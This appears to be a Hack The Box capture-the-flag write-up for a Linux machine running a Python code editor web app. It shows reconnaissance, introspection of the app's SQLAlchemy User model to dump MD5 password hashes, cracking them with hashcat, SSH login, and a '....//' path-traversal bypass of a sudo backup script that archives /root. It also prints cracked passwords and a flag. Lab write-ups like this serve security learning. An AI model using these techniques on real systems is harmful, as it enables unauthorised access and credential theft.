## NMAP
```
nmap 10.10.11.62 -sC -sV -p- -Pn -n --open -oA full_scan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-07 04:18 EDT
Nmap scan report for 10.10.11.62
Host is up (0.0094s latency).
Not shown: 65479 closed tcp ports (reset), 54 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.03 second
```
### 5000 `Gunicorn 20.0.4`
```
whatweb 10.10.11.62:5000                                                    
http://10.10.11.62:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn/20.0.4], IP[10.10.11.62], JQuery[3.6.0], Script, Title[Python Code Editor]
```
Directory busting
```
ffuf -w $dirmedium:FUZZ -u http://10.10.11.62:5000/FUZZ
login                   [Status: 200, Size: 730, Words: 103, Lines: 24, Duration: 26ms]
about                   [Status: 200, Size: 818, Words: 143, Lines: 23, Duration: 29ms]
register                [Status: 200, Size: 741, Words: 103, Lines: 24, Duration: 38ms]
logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 14ms]
codes                   [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 11ms]
```
Python Code editor
![[Pasted image 20250407162052.png]]
Enumerate global variables with `print(globals())`
![[Pasted image 20250407181120.png]]
![[Pasted image 20250407180957.png]]
Remarks: `SQLAlchemy, Flask app`

Find out more about `User` with `print(dir(User))`
![[Pasted image 20250407181344.png]]
Remarks: Reveals username and password and also list all the attributes and methods (`query`)

Check out the table with `print(dir(User.__table__))`
![[Pasted image 20250407183821.png]]
Remarks: From table to columns, like many database

`print(dir(User.__table__.columns))`
![[Pasted image 20250407183955.png]]
Remarks: Using `print(dir(User.__table__.columns.keys))`, `print(dir(User.__table__.columns.items))`, `print(dir(User.__table__.columns.values))` doesn't push us forward in our findings.

Remove `dir` and `print((User.__table__.columns))`
```
ReadOnlyColumnCollection(User.id, user.username, user.password)
```
Remark: If I write `print(dir(User.__table__.columns.keys))`, it shows that keys is a method
![[Pasted image 20250407184554.png]]
Get the keys of the columns with `print(dir(User.__table__.columns.keys()))`
```
['id', 'username', 'password']
```
From here extract the information!
Note: `. __dict__` is one way to **inspect what an object contains**, especially when you have **no access to the source code**.

To retrieve user information
```
u = User.query.get(1)
print(u.__dict__)

{'_sa_instance_state': <sqlalchemy.orm.state.InstanceState object at 0x7ff707f2a1c0>, 'id': 1, 'username': 'development', 'password': '759b74ce43947f5f4c91aeddc3e5bad3'}
```
To retrieve all users information
```python
users = User.query.all()
for user in users:
	print(user.__dict__)

{'_sa_instance_state': <sqlalchemy.orm.state.InstanceState object at 0x7f66f16f3280>, 'password': '759b74ce43947f5f4c91aeddc3e5bad3', 'id': 1, 'username': 'development'} {'_sa_instance_state': <sqlalchemy.orm.state.InstanceState object at 0x7f66f16f32e0>, 'password': '3de6f30c4a09c27fc71932bfc68474be', 'id': 2, 'username': 'martin'}
```
Hashes
```
development:759b74ce43947f5f4c91aeddc3e5bad3
martin:3de6f30c4a09c27fc71932bfc68474be
```
Crack hash
```
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --user --show
development:759b74ce43947f5f4c91aeddc3e5bad3:development
martin:3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster
```
## FOOTHOLD
```
ssh martin@10.10.11.62
martin@10.10.11.62's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)
...
martin@code:~$ whoami
martin
martin@code:~$ id
uid=1000(martin) gid=1000(martin) groups=1000(martin)
```
Check privilege
```
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```
`backy.sh`
```sh
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```
`task.json`
```
cat task.json
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/app-production/app"
        ],

        "exclude": [
                ".*"
        ]
}
```
`tar <FILE>.tar.bz2`
```
tar -xvjf code_home_app-production_app_2024_August.tar.bz2
```
Change the `directories_to_archive`
```
"/home/app-production/user.txt"
"/home/....//root/"
```
Edit the `task.json`
```
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/....//root/"
        ],    
        "exclude": []
}
```
Remarks: Missed out a `dot` at `directories_to_archive` `/home/....//root/` and also the `exclude`: `".*"`
Note: It is useful to consider the destination to `/tmp` due to the privileges

Get `root.txt`
```
martin@code:~/backups$ tar -xvjf code_home_.._root_2025_April.tar.bz2
root/
root/.local/
root/.local/share/
root/.local/share/nano/
root/.local/share/nano/search_history
root/.sqlite_history
root/.profile
root/scripts/
root/scripts/cleanup.sh
root/scripts/backups/
root/scripts/backups/task.json
root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
root/scripts/database.db
root/scripts/cleanup2.sh
root/.python_history
root/root.txt
root/.cache/
root/.cache/motd.legal-displayed
root/.ssh/
root/.ssh/id_rsa
root/.ssh/authorized_keys
root/.bash_history
root/.bashrc
martin@code:~/backups$ ls -la
total 40
drwxr-xr-x 3 martin martin  4096 Apr  8 06:22 .
drwxr-x--- 6 martin martin  4096 Apr  8 06:20 ..
-rw-r--r-- 1 martin martin  5879 Apr  8 06:20 code_home_app-production_app_2024_August.tar.bz2
-rw-r--r-- 1 root   root   12836 Apr  8 06:22 code_home_.._root_2025_April.tar.bz2
drwx------ 6 martin martin  4096 Apr  7 19:42 root
-rw-r--r-- 1 martin martin   169 Apr  8 06:22 task.json
martin@code:~/backups$ cd root
martin@code:~/backups/root$ ls -la
total 36
drwx------ 6 martin martin 4096 Apr  7 19:42 .
drwxr-xr-x 3 martin martin 4096 Apr  8 06:22 ..
lrwxrwxrwx 1 martin martin    9 Jul 27  2024 .bash_history -> /dev/null
-rw-r--r-- 1 martin martin 3106 Dec  5  2019 .bashrc
drwx------ 2 martin martin 4096 Aug 27  2024 .cache
drwxr-xr-x 3 martin martin 4096 Jul 27  2024 .local
-rw-r--r-- 1 martin martin  161 Dec  5  2019 .profile
lrwxrwxrwx 1 martin martin    9 Jul 27  2024 .python_history -> /dev/null
-rw-r----- 1 martin martin   33 Apr  7 19:42 root.txt
drwxr-xr-x 3 martin martin 4096 Sep 16  2024 scripts
lrwxrwxrwx 1 martin martin    9 Jul 27  2024 .sqlite_history -> /dev/null
drwx------ 2 martin martin 4096 Aug 27  2024 .ssh
martin@code:~/backups/root$ cat root.txt
69b70c90390181c8729f5b3d2221c0ec
```
## ROOT
Copied the `id_rsa` 

## Takeaways
When the clipboard stopped working
```
killall VBoxClient
VBoxClient-all
```
Little details in files makes all the difference!

Despite the python editor being a black box, I should have started off from `global` variables and check numerous classes and methods before extracting important information from the database.

##
#HTB #Linux 